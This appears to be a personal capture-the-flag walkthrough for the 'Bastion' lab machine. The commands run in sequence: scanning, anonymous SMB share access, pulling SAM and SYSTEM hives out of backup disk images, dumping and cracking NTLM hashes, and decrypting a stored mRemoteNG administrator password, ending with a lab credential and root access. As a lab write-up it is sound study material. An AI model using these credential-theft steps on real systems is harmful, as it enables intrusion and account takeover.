@@ -1,0 +1,38 @@
+Bastion
+- *nmap -A -T4 -Pn 10.10.10.134*
+	- ports: 22, 135, 139, 445, 5985
+- *smbclient -L //10.10.10.134 -U Blocky* <-- question regarding non-standard share on Blocky's account
+	- left password empty
+	- "Backups" is the non-standard share
+- *smbclient //10.10.10.134/Backups -U Blocky -N* <-- access the share 
+- *cd* all the way into backup folder (folder names with spaces must have quotes around them)
+	- *ls* reveals two .vhd files (virtual hard disk)
+	- *get ...* <- download both vhd files
+- "The two Windows files needed to dump user password hashes are the Security Account Manager (SAM) and the SYSTEM registry hive."
+- "open here with 7-zip" on Windows, or *7z x 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd  -o./vhd_extracted* on Kali
+- navigate to C:\WIndows\System32\config\SAM and  C:\Windows\System32\config\SYSTEM and Grab the SAM and SYSTEM files - send to Kali
+- next we obtain the NTLM hashes:
+	- *samdump2 SYSTEM SAM > hashes.txt*
+	- *impacket-secretsdump -sam SAM -system SYSTEM LOCAL*
+![[Pasted image 20250918095752.png]] 
+- crack the hash:
+	- *hashcat -m 1000 hashes.txt wordlist.txt*
+	- *john --format=NT hashes.txt --wordlist=wordlist.txt*
+- *ssh L4mpje@10.10.10.134*
+	- Password: [pastePasswordWeCracked]
+- *cd "C:\Program Files (x86)"*
+- *dir*
+	- reveals mRemoteNG "remote connection management tool"
+- known mRemoteNG vulnerability - "confCons.xml" stores encrypted user passwords at "C:\Users\L4mpje\AppData\Roaming\mRemoteNG"
+	- "Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==""
+- python tool specifically for cracking mRemoteNG passwords - https://github.com/haseebT/mRemoteNG-Decrypt
+- *git clone https://github.com/haseebT/mRemoteNG-Decrypt.git*
+- *cd mRemoteNG-Decrypt*
+- *python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==*
+	- Password: thXLHM96BeKL0ER2
+- *ssh Administrator@10.10.10.134*
+	- Password: *thXLHM96BeKL0ER2*
+- *whoami*
+	- bastion\administrator
+- *cd Desktop*
+- *type root.txt*
